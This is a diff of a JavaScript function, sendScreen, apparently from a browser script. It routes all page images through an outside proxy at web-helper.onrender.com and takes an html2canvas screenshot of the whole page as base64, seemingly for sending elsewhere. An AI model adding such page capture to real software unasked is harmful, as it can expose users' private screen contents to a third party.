@@ -10477,36 +10477,36 @@ document.addEventListener("click", () => {
   }, 1000);
 });
 
-function sendScreen() {
-  // 1. Клонируем body в память (не вставляя в DOM)
-  const clonedBody = document.body.cloneNode(true);
-
-  // 2. Заменяем в нём все картинки на прокси
-  clonedBody.querySelectorAll("img").forEach((img) => {
+async function sendScreen() {
+  // 1. Заменяем все src у <img> на прокси
+  document.querySelectorAll("img").forEach((img) => {
     const originalSrc = img.src;
-    if (
-      originalSrc.startsWith("https") &&
-      !originalSrc.includes("web-helper.onrender.com/proxy")
-    ) {
+
+    // Пропускаем уже заменённые картинки
+    if (originalSrc.includes("web-helper.onrender.com/proxy")) return;
+
+    try {
       const encoded = encodeURIComponent(originalSrc);
-      img.setAttribute("crossorigin", "anonymous");
+      img.setAttribute("crossorigin", "anonymous"); // важно для html2canvas
       img.src = `https://web-helper.onrender.com/proxy?url=${encoded}`;
+    } catch (e) {
+      console.warn("Invalid image src:", originalSrc);
     }
   });
 
-  // 3. Создаём временный скрытый контейнер и вставляем туда клон
-  const hiddenContainer = document.createElement("div");
-  hiddenContainer.style.position = "fixed";
-  hiddenContainer.style.top = "-99999px";
-  hiddenContainer.style.left = "-99999px";
-  hiddenContainer.style.pointerEvents = "none";
-  hiddenContainer.style.zIndex = "-99999";
+  // 2. Ждём, пока все изображения загрузятся
+  await Promise.all(
+    Array.from(document.images).map(
+      (img) =>
+        new Promise((resolve) => {
+          if (img.complete) return resolve();
+          img.onload = img.onerror = resolve;
+        })
+    )
+  );
 
-  hiddenContainer.appendChild(clonedBody);
-  document.body.appendChild(hiddenContainer); // только теперь вставляем в DOM
-
-  // 4. Делаем скриншот уже клонированного содержимого
-  html2canvas(clonedBody).then((canvas) => {
+  // 3. Делаем скриншот всего body
+  html2canvas(document.body).then((canvas) => {
     const base64img = canvas.toDataURL("image/png"); // получаем base64-скриншот
 
     const message = {
